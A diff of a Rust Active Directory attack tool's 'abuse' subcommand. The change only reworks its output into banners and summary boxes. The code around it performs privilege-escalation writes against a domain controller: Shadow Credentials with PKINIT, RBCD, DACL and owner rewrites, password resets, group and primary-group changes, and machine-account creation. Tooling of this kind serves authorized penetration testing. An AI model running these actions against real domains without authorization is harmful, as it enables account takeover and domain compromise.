@@ -2,6 +2,8 @@
 //! KeyCredential / RBCD / DACL rewrites) plus PKINIT — the exploitation
 //! counterparts to the ACL findings the graph reports.
 
+use crate::ui;
+use crate::ui::OutcomeKind;
 use adhammer_collector::{Collector, LdapConfig};
 use anyhow::{Context, Result};
 use clap::Parser;
@@ -146,8 +148,20 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
     // F-C2 safety: PREVIEW by default. A write only fires when the operator explicitly
     // arms it with `--commit` (and `--dry-run`, if still passed, forces preview either way).
     let dry_run = a.dry_run || !a.commit;
+    // 1.5.3 UX-beauty: bordered verb banner at the top of every abuse invocation so an
+    // operator scrolling their scrollback can find the boundary between attempts.
+    let action_name = format!("{:?}", a.action).to_ascii_lowercase();
+    let mode = if dry_run { "preview" } else { "commit" };
+    ui::verb_banner(
+        "attack abuse",
+        &[
+            ("target", a.target.as_str()),
+            ("action", action_name.as_str()),
+            ("mode", mode),
+        ],
+    );
     if dry_run {
-        crate::ui::note("preview only — no write sent. Re-run with --commit to apply to the DC.");
+        ui::note("preview only — no write sent. Re-run with --commit to apply to the DC.");
     }
     // AbuseArgs.auth.password is Option<String>; resolve through the same @file: / env /
     // TTY-prompt cascade as every other subcommand. `resolve_secret` returns "" when
@@ -179,13 +193,19 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             adhammer_core::SecretArtifact::Ccache,
             tgt.ccache.expose(),
         )?;
-        println!(
-            "[+] PKINIT succeeded — TGT for {}@{} (via {})",
-            a.target, realm, tgt.sname
+        ui::note(&format!(
+            "reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key); via {}",
+            tgt.sname
+        ));
+        let end = tgt.end_time.to_string();
+        let target = format!("{}@{}", a.target, realm);
+        let next = format!("export KRB5CCNAME={cc_path}");
+        ui::summary_box(
+            &target,
+            OutcomeKind::Validated,
+            &[("ccache", cc_path.as_str()), ("expires", end.as_str())],
+            Some(&next),
         );
-        println!("    reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key)");
-        println!("    ticket valid until {}", tgt.end_time);
-        println!("    ccache saved to {cc_path}  (export KRB5CCNAME={cc_path})");
         return Ok(());
     }
 
@@ -223,10 +243,10 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             }
             c.add_value(&target_dn, "servicePrincipalName", &a.value)
                 .await?;
-            println!(
-                "[+] added SPN '{}' to {} — now Kerberoastable",
+            ui::ok(&format!(
+                "added SPN '{}' to {} — now Kerberoastable",
                 a.value, a.target
-            );
+            ));
         }
         AbuseAction::AddMember => {
             let member_dn = crate::target::to_dn(&mut c, &a.value).await?;
@@ -235,7 +255,7 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
                 return Ok(());
             }
             c.add_value(&target_dn, "member", &member_dn).await?;
-            println!("[+] added {} to group {}", a.value, a.target);
+            ui::ok(&format!("added {} to group {}", a.value, a.target));
         }
         AbuseAction::SetPassword => {
             // AD refuses `unicodePwd` writes on an unencrypted channel — save the user a
@@ -258,7 +278,7 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             let pw_secret = crate::resolve_secret(a.value.as_str(), "ADHAMMER_PASSWORD")?;
             c.set_password(&target_dn, pw_secret.expose_secret())
                 .await?;
-            println!("[+] reset password of {}", a.target);
+            ui::ok(&format!("reset password of {}", a.target));
         }
         AbuseAction::AddKeycred => {
             // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
@@ -275,13 +295,15 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             )?;
             c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary)
                 .await?;
-            println!(
-                "[+] added Shadow Credential to {} — key saved to {key_path}",
+            let next = format!(
+                "attack abuse --action pkinit --target {} --value {key_path} --realm <realm> --kdc <dc>",
                 a.target
             );
-            println!(
-                "    (Phase 2: PKINIT with this key to obtain a TGT as {})",
-                a.target
+            ui::summary_box(
+                &a.target,
+                OutcomeKind::Validated,
+                &[("key", key_path.as_str())],
+                Some(&next),
             );
         }
         AbuseAction::WriteRbcd | AbuseAction::AllowedToAct => {
@@ -300,7 +322,7 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
                 }
                 c.delete_attribute(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
                     .await?;
-                println!("[+] cleared RBCD attribute on {}", a.target);
+                ui::ok(&format!("cleared RBCD attribute on {}", a.target));
                 return Ok(());
             }
             // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
@@ -316,10 +338,10 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             }
             c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd)
                 .await?;
-            println!(
-                "[+] wrote RBCD on {} allowing {} to impersonate to it",
+            ui::ok(&format!(
+                "wrote RBCD on {} allowing {} to impersonate to it",
                 a.target, a.value
-            );
+            ));
         }
         AbuseAction::WriteOwner => {
             // Rewrite Owner in nTSecurityDescriptor. Reads existing SD (SD_FLAGS control),
@@ -346,7 +368,7 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             }
             c.write_binary(&target_dn, "nTSecurityDescriptor", new_sd)
                 .await?;
-            println!("[+] wrote Owner={} on {}", trustee, target_dn);
+            ui::ok(&format!("wrote Owner={} on {}", trustee, target_dn));
         }
         AbuseAction::WriteDacl => {
             // Prepend a GENERIC_ALL allow-ACE for the trustee. DACL entries are evaluated
@@ -373,10 +395,10 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             }
             c.write_binary(&target_dn, "nTSecurityDescriptor", new_sd)
                 .await?;
-            println!(
-                "[+] appended GENERIC_ALL ACE for {} on {} DACL",
+            ui::ok(&format!(
+                "appended GENERIC_ALL ACE for {} on {} DACL",
                 trustee, target_dn
-            );
+            ));
         }
         AbuseAction::SetPrimaryGroup => {
             // --value = numeric RID (e.g. 512 for Domain Admins) OR a group sAM whose
@@ -398,10 +420,10 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
             }
             c.modify_replace(&target_dn, "primaryGroupID", &rid.to_string())
                 .await?;
-            println!(
-                "[+] set primaryGroupID={} on {} — now inherits that group's membership",
+            ui::ok(&format!(
+                "set primaryGroupID={} on {} — now inherits that group's membership",
                 rid, a.target
-            );
+            ));
         }
         AbuseAction::SetUacFlags => {
             let add_bits = parse_uac_flags(&a.value)
@@ -415,19 +437,19 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
                 .with_context(|| format!("userAccountControl {cur_text:?} not a u32"))?;
             let new = cur | add_bits;
             if dry_run {
-                println!(
+                ui::info(&format!(
                     "[dry-run] would write userAccountControl={:#010x} (was {:#010x}) on {}",
                     new, cur, target_dn
-                );
-                println!("[dry-run] no change made");
+                ));
+                ui::info("[dry-run] no change made");
                 return Ok(());
             }
             c.modify_replace(&target_dn, "userAccountControl", &new.to_string())
                 .await?;
-            println!(
-                "[+] set userAccountControl={:#010x} (was {:#010x}) on {}",
+            ui::ok(&format!(
+                "set userAccountControl={:#010x} (was {:#010x}) on {}",
                 new, cur, a.target
-            );
+            ));
         }
         AbuseAction::GpoLinkModify => {
             // Read current gPLink text (may be empty). Append the new link entry.
@@ -446,7 +468,7 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
                 return Ok(());
             }
             c.modify_replace(&target_dn, "gPLink", &combined).await?;
-            println!("[+] linked GPO {} to OU {}", guid, target_dn);
+            ui::ok(&format!("linked GPO {} to OU {}", guid, target_dn));
         }
         AbuseAction::CreateComputer => {
             // Stream 7 / machine-add via LDAP: MachineAccountQuota bootstrap.
@@ -509,7 +531,9 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
                 ("unicodePwd", vec![unicode_pwd]),
             ];
             if dry_run {
-                println!("[dry-run] would add {dn} (sAM={sam}, host={dns_host})");
+                ui::info(&format!(
+                    "[dry-run] would add {dn} (sAM={sam}, host={dns_host})"
+                ));
                 return Ok(());
             }
             c.add_object(&dn, attrs).await.with_context(|| {
@@ -518,7 +542,9 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
                      (0 = disabled by policy → falls back to impacket-addcomputer)"
                 )
             })?;
-            println!("[+] created computer {sam} — trustee ready for RBCD (dn={dn})");
+            ui::ok(&format!(
+                "created computer {sam} — trustee ready for RBCD (dn={dn})"
+            ));
         }
         AbuseAction::Pkinit => unreachable!("pkinit handled above the LDAP-connect block"),
     }
@@ -528,9 +554,14 @@ pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
 // ─────────────────────────── pure helpers ───────────────────────────
 
 /// `[dry-run] …` line printed instead of executing a write. Matches the plan spec.
+/// 1.5.3 UX-beauty sweep: routed through `ui::info` so it lands on stderr (keeping
+/// stdout clean for pipe/JSON consumers) with the `[dry-run]` prefix preserved for
+/// grep-based scripting.
 fn dry_run_line(attr: &str, target: &str, value: &str) {
-    println!("[dry-run] would write attribute={attr} target={target} value={value}");
-    println!("[dry-run] no change made");
+    ui::info(&format!(
+        "[dry-run] would write attribute={attr} target={target} value={value}"
+    ));
+    ui::info("[dry-run] no change made");
 }
 
 /// Hex-encode a byte slice, uppercase, no separators — for `--dry-run` SD dumps.
